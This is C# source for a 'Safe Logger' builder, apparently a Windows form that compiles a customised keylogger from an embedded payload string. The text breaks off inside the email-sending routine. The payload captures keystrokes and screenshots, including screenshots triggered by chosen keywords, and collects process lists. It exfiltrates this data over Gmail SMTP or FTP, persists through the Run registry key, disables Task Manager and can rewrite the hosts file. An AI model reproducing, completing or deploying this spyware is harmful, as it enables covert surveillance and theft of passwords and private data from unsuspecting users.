using System;
using System.Windows.Forms;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;

namespace Safe_Logger
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Voice.speak(button1.Text);
            Utils.exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Voice.speak(button2.Text);
            string buildName = buildnameinput.Text.Trim();

            string keystrokesTime = tkeysinput.Text.Trim();
            string processesTime = tprocinput.Text.Trim();
            string screenshotsTime = tssinput.Text.Trim();
            int kTime, pTime, sTime;
            bool kTimeR, pTimeR, sTimeR;

            kTimeR = Int32.TryParse(keystrokesTime, out kTime);
            pTimeR = Int32.TryParse(processesTime, out pTime);
            sTimeR = Int32.TryParse(screenshotsTime, out sTime);

            bool shutdownOnExit = checkBox1.Checked;
            bool makeProgramStartUp = startupcheck.Checked;
            bool disableTaskManager = taskcheck.Checked;
            bool sendKeys = keyscheck.Checked;
            bool sendProcesses = proccheck.Checked;
            bool sendScreenshots = sscheck.Checked;
            bool lockFiles = false;
            bool blockWebsites = false;

            List<string> websites = new List<string>();
            List<string> files = new List<string>();

            int sendType = 0;

            int smtpPort = 0;
            int lanPort = 0;
            bool smptpR, lanR;
            string email = emailin.Text.Trim();
            string password = passin.Text.Trim();
            string subject = subjin.Text.Trim();
            string url = urlin.Text.Trim();
            string username = userin.Text.Trim();
            string passftp = passwin.Text.Trim();
            string ftpPath = ftp_path.Text.Trim();

            char[] sep = { '|' };

            if (gmail.Checked == true)
            {
                sendType = 1;
            }
            else if (ftp.Checked == true)
            {
                sendType = 2;
            }
            else
            {
                sendType = 0;
            }

            int start, end;
            start = end = 0;

            if (!allday.Checked)
            {
                if (string.IsNullOrEmpty(sinp.Text) || string.IsNullOrEmpty(einp.Text))
                {
                    Utils.log("Invalid value in working hours!");
                    return;
                }

                bool _s, _e;

                _s = Int32.TryParse(sinp.Text, out start);
                _e = Int32.TryParse(einp.Text, out end);

                if (!_s || !_e)
                {
                    Utils.log("Invalid value in working hours!");
                    return;
                }
            }

            if (sendType == 1)
            {
                if (!emailin.Text.Trim().Contains("@") || !emailin.Text.Trim().Contains("."))
                {
                    Utils.log("Invalid email!");
                    return;
                }
            }

            if (sendType == 0)
            {
                Utils.log("Invalid type of data sending!");
                return;
            }

            if (sendType == 1)
            {
                smptpR = Int32.TryParse(sportin.Text.Trim(), out smtpPort);

                if (string.IsNullOrEmpty(email))
                {
                    Utils.log("Invalid email!");
                    return;
                }
                else if (string.IsNullOrEmpty(password))
                {
                    Utils.log("Invalid password!");
                    return;
                }
                else if (string.IsNullOrEmpty(subject))
                {
                    Utils.log("Invalid subject!");
                    return;
                }
                if (!smptpR)
                {
                    Utils.log("Invalid port!");
                    return;
                }

                url = null;
                username = null;
                passftp = null;
            }
            else if (sendType == 2)
            {
                if (string.IsNullOrEmpty(url))
                {
                    Utils.log("Invalid url!");
                    return;
                }
                else if (string.IsNullOrEmpty(username))
                {
                    Utils.log("Invalid username!");
                    return;
                }
                else if (string.IsNullOrEmpty(passftp))
                {
                    Utils.log("Invalid password!");
                    return;
                }
                else if (string.IsNullOrEmpty(ftpPath))
                {
                    Utils.log("Invalid path!");
                    return;
                }
            }
            else
            {
                Utils.log("Data Sending Option not found!");
                return;
            }

            if (kTime <= 0 && sendKeys && kTimeR)
            {
                Utils.log("Invalid input at Send Keystrokes delay!");
                return;
            }

            if (pTime <= 0 && sendProcesses && pTimeR)
            {
                Utils.log("Invalid input at Send Processes delay!");
                return;
            }

            if (sTime <= 0 && sendScreenshots && sTimeR)
            {
                Utils.log("Invalid input at Send Screenshots delay!");
                return;
            }

            if (!kTimeR && sendKeys)
            {
                Utils.log("Invalid input at Send Keystrokes delay!");
                return;
            }

            if (!pTimeR && sendProcesses)
            {
                Utils.log("Invalid input at Send Processes delay!");
                return;
            }

            if (!sTimeR && sendScreenshots)
            {
                Utils.log("Invalid input at Send Screenshots delay!");
                return;
            }

            if (string.IsNullOrEmpty(buildName))
            {
                Utils.log("Build name is empty!");
                return;
            }

            
            if (!blockWebsites)
            {
                websites.Add("null");
            }

            if (!lockFiles)
            {
                files.Add("null");
            }

            string _k1 = "notInUse"; string _k2 = "notInUse"; string _k3 = "notInUse"; string _k4 = "notInUse"; string _k5 = "notInUse"; string _k6 = "notInUse"; string _k7 = "notInUse"; string _k8 = "notInUse"; string _k9 = "notInUse"; string _k10 = "notInUse";
            _k1 = k1.Text;
            _k2 = k2.Text;
            _k3 = k3.Text;
            _k4 = k4.Text;
            _k5 = k5.Text;
            _k6 = k6.Text;
            _k7 = k7.Text;
            _k8 = k8.Text;
            _k9 = k9.Text;
            _k10 = k10.Text;

            if (string.IsNullOrEmpty(_k1)) _k1 = "notInUse";
            if (string.IsNullOrEmpty(_k2)) _k2 = "notInUse";
            if (string.IsNullOrEmpty(_k3)) _k3 = "notInUse";
            if (string.IsNullOrEmpty(_k4)) _k4 = "notInUse";
            if (string.IsNullOrEmpty(_k5)) _k5 = "notInUse";
            if (string.IsNullOrEmpty(_k6)) _k6 = "notInUse";
            if (string.IsNullOrEmpty(_k7)) _k7 = "notInUse";
            if (string.IsNullOrEmpty(_k8)) _k8 = "notInUse";
            if (string.IsNullOrEmpty(_k9)) _k9 = "notInUse";
            if (string.IsNullOrEmpty(_k10)) _k10 = "notInUse";

            build(sendKeys, sendScreenshots, sendProcesses, disableTaskManager, makeProgramStartUp, blockWebsites, lockFiles, websites, files, kTime, sTime, pTime, smtpPort, email, password, subject, url, username, passftp, "notInUse", lanPort, Utils.license, buildName + ".exe", shutdownOnExit, sendType, ftpPath, start, end, allday.Checked, _k1, _k2, _k3, _k4, _k5, _k6, _k7, _k8, _k9, _k10);
        }

        void build(bool sendKeyStrokes, bool sendScreenshots, bool sendProccesses, bool disableTaskManager, bool makeItStartUp, bool blockWebsites, bool lockFiles, List<string> websitesToBeBlocked, List<string> filesToBeLocked, int secondsForKeys, int secondsForScreenshots, int secondsForProcesses, int smtpPort, string email, string password, string subject, string ftpUrl, string ftpUsername, string ftpPassword, string lanIp, int lanPort, string license, string buildName, bool shutdownOnClose, int sendType, string ftpPath, int timeToStart, int timeToEnd, bool allDay, string _k1, string _k2, string _k3, string _k4, string _k5, string _k6, string _k7, string _k8, string _k9, string _k10)
        {
            blockWebsites = false;
            lockFiles = false;
            string toEmail = email;

        /*    if (sendType == 1)
            {
                char[] sep = { '@' };
                string[] n = email.Split(sep);
                email = n[0] + @"" + n[1];

                toEmail = email;
            }*/

            if (string.IsNullOrEmpty(email)) email = "notInUse";
            if (string.IsNullOrEmpty(toEmail)) toEmail = "notInUse";
            if (string.IsNullOrEmpty(password)) password = "notInUse";
            if (string.IsNullOrEmpty(subject)) subject = "notInUse";
            if (string.IsNullOrEmpty(ftpUrl)) ftpUrl = "notInUse";
            if (string.IsNullOrEmpty(ftpUsername)) ftpUsername = "notInUse";
            if (string.IsNullOrEmpty(ftpPassword)) ftpPassword = "notInUse";
            if (string.IsNullOrEmpty(lanIp)) lanIp = "notInUse";
            if (string.IsNullOrEmpty(license)) license = "notInUse";
            if (string.IsNullOrEmpty(ftpPath)) ftpPath = "notInUse";
            if (string.IsNullOrEmpty(buildName)) { Utils.log("Empty build name!"); return; }

            string sendScreenshotsS, sendKeystrokesS, sendProcessesS, disableTaskManagerS, makeItStartUpS, shutdownOnCloseS;
            if (sendScreenshots)
            {
                sendScreenshotsS = "true";
            }
            else
            {
                sendScreenshotsS = "false";
            }

            if (sendKeyStrokes)
            {
                sendKeystrokesS = "true";
            }
            else
            {
                sendKeystrokesS = "false";
            }

            if (sendProccesses)
            {
                sendProcessesS = "true";
            }
            else
            {
                sendProcessesS = "false";
            }

            if (disableTaskManager)
            {
                disableTaskManagerS = "true";
            }
            else
            {
                disableTaskManagerS = "false";
            }

            if (makeItStartUp)
            {
                makeItStartUpS = "true";
            }
            else
            {
                makeItStartUpS = "false";
            }
            if (shutdownOnClose)
            {
                shutdownOnCloseS = "true";
            }
            else
            {
                shutdownOnCloseS = "false";
            }
            string _allDay = "false";
            if (allDay)
            {
                _allDay = "true";
            }

            string code = @"using Microsoft.Win32;
            using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using Gma.System.MouseKeyHook;

namespace SafeLoggerOutput
{
    class Config
    {
        public static int senderType = " + sendType + @";
        public static string input = ""Input: "";
public static string tempInput = """";
        public static bool sendScreenShot = " + sendScreenshotsS + @";
        public static bool sendKeys = " + sendKeystrokesS + @";
        public static bool sendProcesses = " + sendProcessesS + @";
        public static bool disableTaskManager = " + disableTaskManagerS + @";
        public static bool makeItStartUp = " + makeItStartUpS + @";
        public static bool shutdownPcOnProgramClose = " + shutdownOnCloseS + @";
        public static bool blockWebsites = false;
        public static bool lockFiles = false;

public static string k1 = @""" + _k1 + @""";
public static string k2 = @""" + _k2 + @""";
public static string k3 = @""" + _k3 + @""";
public static string k4 = @""" + _k4 + @""";
public static string k5 = @""" + _k5 + @""";
public static string k6 = @""" + _k6 + @""";
public static string k7 = @""" + _k7 + @""";
public static string k8 = @""" + _k8 + @""";
public static string k9 = @""" + _k9 + @""";
public static string k10 = @""" + _k10 + @""";
public static string currentWord = """";

public static int timeToStart = " + timeToStart + @";
public static int timeToEnd = " + timeToEnd + @";
public static bool allDay = " + _allDay + @";

public static string[] websitesToBeBlocked = { ""null""};
        public static string[] filesToBeLocked = { ""null""};

        public static int secondsToSendNewKeys = 60 * " + secondsForKeys + @";
        public static int secondsForScreenShot = 60 * " + secondsForScreenshots + @";
        public static int secondsToGetProcesses = 60 * " + secondsForProcesses + @";

        public static int smtpPort = " + smtpPort + @"; 
        public static string username = @""" + email + @""";  public static string password = @""" + password + @""";
        public static string toEmail = @""" + email + @""";
        public static string subject =@""" + subject + @"""; 

        public static string ftpUrl =@""" + ftpUrl + @""";
        public static string ftpUsername =@""" + ftpUsername + @""";
        public static string ftpPassword = @""" + ftpPassword + @""";
        public static string ftpPath = @""" + ftpPath + @""";

        public static string ip = @""" + lanIp + @""";
        public static int port = " + lanPort + @";

        public static string license = @""" + license + @""";

      

        public static bool isAdmin()
        {
            bool isAdminFinal = false;

            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                isAdminFinal = true;

            return isAdminFinal;
        }
    }

 internal class LogKeys
    {
        public static void Do()
        {
            Hook.GlobalEvents().KeyPress += (sender, e) =>
            {
                Config.tempInput += e.KeyChar;
                Config.input += e.KeyChar + "" | "";
if (e.KeyChar.ToString() == """" || e.KeyChar.ToString() == "" "") {
Config.currentWord = """";
} else {
Config.currentWord += e.KeyChar;
}
            };
        }
    }

    class KeyListener
    {
      public static KeyListener getInstance;
        public static void init() { getInstance = new KeyListener(); }
        public void initLogger() { startLogger(); initTimer(); }


        void startLogger()
            {
                if (!Config.sendKeys)
                    return;

    new System.Threading.Thread(() =>
        {
            while (true)
            {
                if (Config.input.Length >= 200)
                {
            DataSender.getInstance.send(Config.input + "" ["" + DateTime.Now.ToString(""HH:mm:ss tt"") + ""]"", Config.senderType);
            Config.input = ""Input: "";
                }
            }
        }).Start();

new Thread(() => {
                  LogKeys.Do();
                  Application.Run(new ApplicationContext());
}).Start();
            }

            void initTimer()
        {
            if (!Config.sendKeys)
                return;

            new Thread(() =>
            {
                System.Timers.Timer timer = new System.Timers.Timer(1000 * Config.secondsToSendNewKeys);
                timer.Elapsed += async (sender, e) => await HandleTimer();
                timer.AutoReset = true;
                timer.Start();
            }).Start();
        }

        private Task HandleTimer()
        {
            if (Config.input == ""Input: "") {  return Task.CompletedTask;}
            DataSender.getInstance.send(Config.input + "" ["" + DateTime.Now.ToString(""HH:mm:ss tt"") + ""]"", Config.senderType);
            Config.input = ""Input: "";
            return Task.CompletedTask;
        }
    }

    class Misc
{
    public static Misc getInstance;
    public static void init() { getInstance = new Misc(); }

    public void initMisc() { initExitHandler(); startScreenshotTimer(); getAllProcess();  }


    void initExitHandler()
    {
        if (!Config.shutdownPcOnProgramClose)
            return;

        Application.ApplicationExit += new EventHandler(Application_ApplicationExit);
    }

    void Application_ApplicationExit(Object sender, EventArgs e)
    {
        shutdownTheComputer();
    }

    void shutdownTheComputer()
    {
        var process = new ProcessStartInfo(""shutdown"", "" / s / t 0"");
        process.CreateNoWindow = true;
        process.UseShellExecute = false;
        Process.Start(process);
    }

    void startScreenshotTimer()
    {
        if (!Config.sendScreenShot)
            return;

new Thread(() => {
while (true) {
string cw = Config.currentWord;

if (cw == Config.k1 ||cw == Config.k2 ||cw == Config.k3 ||cw == Config.k4 ||cw == Config.k5 ||cw == Config.k6 ||cw == Config.k7 ||cw == Config.k8 ||cw == Config.k9 ||cw == Config.k10) {
            DataSender.getInstance.send(""Keyword Captured"", Config.senderType, captureScreenshot(), true);
}
}
}).Start();

new Thread(() => {
        System.Timers.Timer ssTimer = new System.Timers.Timer(1000 * Config.secondsForScreenShot);
        ssTimer.Elapsed += async (sender, e) => await HandleScreenshotTimer();
        ssTimer.AutoReset = true;
        ssTimer.Start();
}).Start();
    }

    private Task HandleScreenshotTimer()
    {
            DataSender.getInstance.send(""Screenshot"", Config.senderType, captureScreenshot(), true);
        return Task.CompletedTask;
    }

    string captureScreenshot()
    {
           Bitmap img;
            img = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Size s = new Size(img.Height, img.Height);
            Graphics gfx = Graphics.FromImage(img);
            gfx.CopyFromScreen(0, 0, 0, 0, s);

            string str = """";
            try
            {
if (File.Exists(""Screenshot.jpg"")) { File.Delete(""Screenshot.png""); }
                str = string.Format(""Screenshot.jpg"");
        }
            catch (Exception e) { DataSender.getInstance.send(e.Message, Config.senderType); }

    img.Save(str);
        return str;
    }

    void blockWebsite(string[] websites)
    {
        if (!Config.blockWebsites)
            return;

        if (websites.Length <= 0)
            return;

        try
        {
            string path = @""C:\Windows\System32\drivers\etc\hosts"";
            StreamWriter sw = new StreamWriter(path, true);
            string[] final = new string[websites.Length];
            for (int i = 0; i < websites.Length; i++)
            {
                final[i] = ""\n 127.0.0.1 "" + websites[i];
            }
            for (int i = 0; i < websites.Length; i++)
            {
                sw.Write(final[i]);
            }
            sw.Close();
        }
        catch (Exception e) { DataSender.getInstance.send(e.Message, Config.senderType); }
    }

    void lockFile(string[] files)
    {
        if (!Config.lockFiles)
            return;

        if (files.Length <= 0)
            return;

        for (int i = 0; i < files.Length; i++)
        {
            var fs = File.Open(files[i], FileMode.Open, FileAccess.Read, FileShare.Read);
        }

        try
        {
        }
        catch (Exception e) { DataSender.getInstance.send(e.Message, Config.senderType); }
    }

    void getAllProcess()
    {
        if (!Config.sendProcesses)
            return;

new Thread(() => {
        System.Timers.Timer processesTimer = new System.Timers.Timer(1000 * Config.secondsToGetProcesses);
        processesTimer.Elapsed += async (sender, e) => await HandleProcessTask();
        processesTimer.AutoReset = true;
        processesTimer.Start();
		}).Start();
    }

    private Task HandleProcessTask()
    {
        Process[] ps = Process.GetProcesses();
        string process = """";

        foreach (Process p in ps)
        {
            if (p != null)
            {
                process += ""Process Name: "" + p.ProcessName + "" | ID: "" + p.Id + ""\n"";
            }
        }

        if (!string.IsNullOrEmpty(process))
        {
                DataSender.getInstance.send(process, Config.senderType);
        }

        return Task.CompletedTask;
    }
}

class Regs
{
    public static Regs getInstance; public static void init() { getInstance = new Regs(); }
    public void initRegistrySettings()
    {
        if (Config.makeItStartUp)
            SetStartup(true);
        if (Config.disableTaskManager)
            SetTaskManager(false);

    }

    //this will make the program start each time the computer starts
    public void SetStartup(bool a)
    {
        try
        {
            if (a)
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
                key.SetValue(System.AppDomain.CurrentDomain.FriendlyName, @"""" + System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location));
            }
            else
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
                key.DeleteValue(System.AppDomain.CurrentDomain.FriendlyName, false);
            }
        }
        catch (Exception e) { DataSender.getInstance.send(e.Message, Config.senderType); }
    }

    //disables the task manager or enables it
    public void SetTaskManager(bool enable)
    {
        try
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @""Software\Microsoft\Windows\CurrentVersion\Policies\System"");
            if (enable && objRegistryKey.GetValue(""DisableTaskMgr"") != null)
                objRegistryKey.DeleteValue(""DisableTaskMgr"");
            else
                objRegistryKey.SetValue(""DisableTaskMgr"", ""1"");
            objRegistryKey.Close();
        }
        catch (Exception e) { DataSender.getInstance.send(e.Message, Config.senderType); }
    }
}

class ftp
{
    private string host = null;
    private string user = null;
    private string pass = null;
    private FtpWebRequest ftpRequest = null;
    private FtpWebResponse ftpResponse = null;
    private Stream ftpStream = null;
    private int bufferSize = 2048;

    /* Construct Object */
    public ftp(string hostIP, string userName, string password) { host = hostIP; user = userName; pass = password; }

    /* Download File */
    public void download(string remoteFile, string localFile)
    {
        try
        {
            /* Create an FTP Request */
            ftpRequest = (FtpWebRequest)FtpWebRequest.Create(host + ""/"" + remoteFile);
            /* Log in to the FTP Server with the User Name and Password Provided */
            ftpRequest.Credentials = new NetworkCredential(user, pass);
            /* When in doubt, use these options */
            ftpRequest.UseBinary = true;
            ftpRequest.UsePassive = true;
            ftpRequest.KeepAlive = true;
            /* Specify the Type of FTP Request */
            ftpRequest.Method = WebRequestMethods.Ftp.DownloadFile;
            /* Establish Return Communication with the FTP Server */
            ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
            /* Get the FTP Server's Response Stream */
            ftpStream = ftpResponse.GetResponseStream();
            /* Open a File Stream to Write the Downloaded File */
            FileStream localFileStream = new FileStream(localFile, FileMode.Create);
            /* Buffer for the Downloaded Data */
            byte[] byteBuffer = new byte[bufferSize];
            int bytesRead = ftpStream.Read(byteBuffer, 0, bufferSize);
            /* Download the File by Writing the Buffered Data Until the Transfer is Complete */
            try
            {
                while (bytesRead > 0)
                {
                    localFileStream.Write(byteBuffer, 0, bytesRead);
                    bytesRead = ftpStream.Read(byteBuffer, 0, bufferSize);
                }
            }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
            /* Resource Cleanup */
            localFileStream.Close();
            ftpStream.Close();
            ftpResponse.Close();
            ftpRequest = null;
        }
        catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        return;
    }

    /* Upload File */
    public void upload(string remoteFile, string localFile)
    {
        try
        {
            /* Create an FTP Request */
            ftpRequest = (FtpWebRequest)FtpWebRequest.Create(host + ""/"" + remoteFile);
            /* Log in to the FTP Server with the User Name and Password Provided */
            ftpRequest.Credentials = new NetworkCredential(user, pass);
            /* When in doubt, use these options */
            ftpRequest.UseBinary = true;
            ftpRequest.UsePassive = true;
            ftpRequest.KeepAlive = true;
            /* Specify the Type of FTP Request */
            ftpRequest.Method = WebRequestMethods.Ftp.UploadFile;
            /* Establish Return Communication with the FTP Server */
            ftpStream = ftpRequest.GetRequestStream();
            /* Open a File Stream to Read the File for Upload */
            FileStream localFileStream = new FileStream(localFile, FileMode.Create);
            /* Buffer for the Downloaded Data */
            byte[] byteBuffer = new byte[bufferSize];
            int bytesSent = localFileStream.Read(byteBuffer, 0, bufferSize);
            /* Upload the File by Sending the Buffered Data Until the Transfer is Complete */
            try
            {
                while (bytesSent != 0)
                {
                    ftpStream.Write(byteBuffer, 0, bytesSent);
                    bytesSent = localFileStream.Read(byteBuffer, 0, bufferSize);
                }
            }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
            /* Resource Cleanup */
            localFileStream.Close();
            ftpStream.Close();
            ftpRequest = null;
        }
        catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        return;
    }

    /* Delete File */
    public void delete(string deleteFile)
    {
        try
        {
            /* Create an FTP Request */
            ftpRequest = (FtpWebRequest)WebRequest.Create(host + ""/"" + deleteFile);
            /* Log in to the FTP Server with the User Name and Password Provided */
            ftpRequest.Credentials = new NetworkCredential(user, pass);
            /* When in doubt, use these options */
            ftpRequest.UseBinary = true;
            ftpRequest.UsePassive = true;
            ftpRequest.KeepAlive = true;
            /* Specify the Type of FTP Request */
            ftpRequest.Method = WebRequestMethods.Ftp.DeleteFile;
            /* Establish Return Communication with the FTP Server */
            ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
            /* Resource Cleanup */
            ftpResponse.Close();
            ftpRequest = null;
        }
        catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        return;
    }

    /* Rename File */
    public void rename(string currentFileNameAndPath, string newFileName)
    {
        try
        {
            /* Create an FTP Request */
            ftpRequest = (FtpWebRequest)WebRequest.Create(host + ""/"" + currentFileNameAndPath);
            /* Log in to the FTP Server with the User Name and Password Provided */
            ftpRequest.Credentials = new NetworkCredential(user, pass);
            /* When in doubt, use these options */
            ftpRequest.UseBinary = true;
            ftpRequest.UsePassive = true;
            ftpRequest.KeepAlive = true;
            /* Specify the Type of FTP Request */
            ftpRequest.Method = WebRequestMethods.Ftp.Rename;
            /* Rename the File */
            ftpRequest.RenameTo = newFileName;
            /* Establish Return Communication with the FTP Server */
            ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
            /* Resource Cleanup */
            ftpResponse.Close();
            ftpRequest = null;
        }
        catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        return;
    }

    /* Create a New Directory on the FTP Server */
    public void createDirectory(string newDirectory)
    {
        try
        {
            /* Create an FTP Request */
            ftpRequest = (FtpWebRequest)WebRequest.Create(host + ""/"" + newDirectory);
            /* Log in to the FTP Server with the User Name and Password Provided */
            ftpRequest.Credentials = new NetworkCredential(user, pass);
            /* When in doubt, use these options */
            ftpRequest.UseBinary = true;
            ftpRequest.UsePassive = true;
            ftpRequest.KeepAlive = true;
            /* Specify the Type of FTP Request */
            ftpRequest.Method = WebRequestMethods.Ftp.MakeDirectory;
            /* Establish Return Communication with the FTP Server */
            ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
            /* Resource Cleanup */
            ftpResponse.Close();
            ftpRequest = null;
        }
        catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        return;
    }

    /* Get the Date/Time a File was Created */
    public string getFileCreatedDateTime(string fileName)
    {
        try
        {
            /* Create an FTP Request */
            ftpRequest = (FtpWebRequest)FtpWebRequest.Create(host + ""/"" + fileName);
            /* Log in to the FTP Server with the User Name and Password Provided */
            ftpRequest.Credentials = new NetworkCredential(user, pass);
            /* When in doubt, use these options */
            ftpRequest.UseBinary = true;
            ftpRequest.UsePassive = true;
            ftpRequest.KeepAlive = true;
            /* Specify the Type of FTP Request */
            ftpRequest.Method = WebRequestMethods.Ftp.GetDateTimestamp;
            /* Establish Return Communication with the FTP Server */
            ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
            /* Establish Return Communication with the FTP Server */
            ftpStream = ftpResponse.GetResponseStream();
            /* Get the FTP Server's Response Stream */
            StreamReader ftpReader = new StreamReader(ftpStream);
            /* Store the Raw Response */
            string fileInfo = null;
            /* Read the Full Response Stream */
            try { fileInfo = ftpReader.ReadToEnd(); }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
            /* Resource Cleanup */
            ftpReader.Close();
            ftpStream.Close();
            ftpResponse.Close();
            ftpRequest = null;
            /* Return File Created Date Time */
            return fileInfo;
        }
        catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        /* Return an Empty string Array if an Exception Occurs */
        return """";
    }

    /* Get the Size of a File */
    public string getFileSize(string fileName)
    {
        try
        {
            /* Create an FTP Request */
            ftpRequest = (FtpWebRequest)FtpWebRequest.Create(host + ""/"" + fileName);
            /* Log in to the FTP Server with the User Name and Password Provided */
            ftpRequest.Credentials = new NetworkCredential(user, pass);
            /* When in doubt, use these options */
            ftpRequest.UseBinary = true;
            ftpRequest.UsePassive = true;
            ftpRequest.KeepAlive = true;
            /* Specify the Type of FTP Request */
            ftpRequest.Method = WebRequestMethods.Ftp.GetFileSize;
            /* Establish Return Communication with the FTP Server */
            ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
            /* Establish Return Communication with the FTP Server */
            ftpStream = ftpResponse.GetResponseStream();
            /* Get the FTP Server's Response Stream */
            StreamReader ftpReader = new StreamReader(ftpStream);
            /* Store the Raw Response */
            string fileInfo = null;
            /* Read the Full Response Stream */
            try { while (ftpReader.Peek() != -1) { fileInfo = ftpReader.ReadToEnd(); } }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
            /* Resource Cleanup */
            ftpReader.Close();
            ftpStream.Close();
            ftpResponse.Close();
            ftpRequest = null;
            /* Return File Size */
            return fileInfo;
        }
        catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        /* Return an Empty string Array if an Exception Occurs */
        return """";
    }

    /* List Directory Contents File/Folder Name Only */
    public string[] directoryListSimple(string directory)
    {
        try
        {
            /* Create an FTP Request */
            ftpRequest = (FtpWebRequest)FtpWebRequest.Create(host + ""/"" + directory);
            /* Log in to the FTP Server with the User Name and Password Provided */
            ftpRequest.Credentials = new NetworkCredential(user, pass);
            /* When in doubt, use these options */
            ftpRequest.UseBinary = true;
            ftpRequest.UsePassive = true;
            ftpRequest.KeepAlive = true;
            /* Specify the Type of FTP Request */
            ftpRequest.Method = WebRequestMethods.Ftp.ListDirectory;
            /* Establish Return Communication with the FTP Server */
            ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
            /* Establish Return Communication with the FTP Server */
            ftpStream = ftpResponse.GetResponseStream();
            /* Get the FTP Server's Response Stream */
            StreamReader ftpReader = new StreamReader(ftpStream);
            /* Store the Raw Response */
            string directoryRaw = null;
            /* Read Each Line of the Response and Append a Pipe to Each Line for Easy Parsing */
            try { while (ftpReader.Peek() != -1) { directoryRaw += ftpReader.ReadLine() + ""|""; } }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
            /* Resource Cleanup */
            ftpReader.Close();
            ftpStream.Close();
            ftpResponse.Close();
            ftpRequest = null;
            /* Return the Directory Listing as a string Array by Parsing 'directoryRaw' with the Delimiter you Append (I use | in This Example) */
            try { string[] directoryList = directoryRaw.Split(""|"".ToCharArray()); return directoryList; }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        }
        catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        /* Return an Empty string Array if an Exception Occurs */
        return new string[] { """" };
    }

    /* List Directory Contents in Detail (Name, Size, Created, etc.) */
    public string[] directoryListDetailed(string directory)
    {
        try
        {
            /* Create an FTP Request */
            ftpRequest = (FtpWebRequest)FtpWebRequest.Create(host + ""/"" + directory);
            /* Log in to the FTP Server with the User Name and Password Provided */
            ftpRequest.Credentials = new NetworkCredential(user, pass);
            /* When in doubt, use these options */
            ftpRequest.UseBinary = true;
            ftpRequest.UsePassive = true;
            ftpRequest.KeepAlive = true;
            /* Specify the Type of FTP Request */
            ftpRequest.Method = WebRequestMethods.Ftp.ListDirectoryDetails;
            /* Establish Return Communication with the FTP Server */
            ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
            /* Establish Return Communication with the FTP Server */
            ftpStream = ftpResponse.GetResponseStream();
            /* Get the FTP Server's Response Stream */
            StreamReader ftpReader = new StreamReader(ftpStream);
            /* Store the Raw Response */
            string directoryRaw = null;
            /* Read Each Line of the Response and Append a Pipe to Each Line for Easy Parsing */
            try { while (ftpReader.Peek() != -1) { directoryRaw += ftpReader.ReadLine() + ""|""; } }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
            /* Resource Cleanup */
            ftpReader.Close();
            ftpStream.Close();
            ftpResponse.Close();
            ftpRequest = null;
            /* Return the Directory Listing as a string Array by Parsing 'directoryRaw' with the Delimiter you Append (I use | in This Example) */
            try { string[] directoryList = directoryRaw.Split(""|"".ToCharArray()); return directoryList; }
            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        }
        catch (Exception ex) { Console.WriteLine(ex.ToString()); }
        /* Return an Empty string Array if an Exception Occurs */
        return new string[] { """" };
    }
}

class DataSender
{
    public static DataSender getInstance; public static void init() { getInstance = new DataSender(); }

    //type: 1 = gmail, 2 = ftp, 3 = lan
    public void send(string text, int type, string img = """", bool sendImage = false)
    {
        if (string.IsNullOrEmpty(text))
            return;
			
if (!Config.allDay) {
  TimeSpan now = DateTime.Now.TimeOfDay;
        TimeSpan start = new TimeSpan(Config.timeToStart, 0, 0);
        TimeSpan end = new TimeSpan(Config.timeToEnd, 0, 0);
        if ((now < start) && (now > end))
        {
            return;
        }
}


            string ttemp2 =  ""User: "" + Environment.UserName;
string ttemp02 = ttemp2 + "" : "";
string ttemp3 = ttemp02 + text;
text = ttemp3;


        if (type == 1)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient(""smtp.gmail.com"");

                mail.From = new MailAddress(Config.username);
                mail.To.Add(Config.username);
                mail.Subject = Config.subject; 

if (!sendImage) {
                mail.Body = text;
}

                if (sendImage)
                {
       string htmlBody = ""<html><body><h1>Picture</h1><br><img src=\""cid:Screenshot\""></body></html>"";
        System.Net.Mail.AlternateView avHtml = System.Net.Mail.AlternateView.CreateAlternateViewFromString
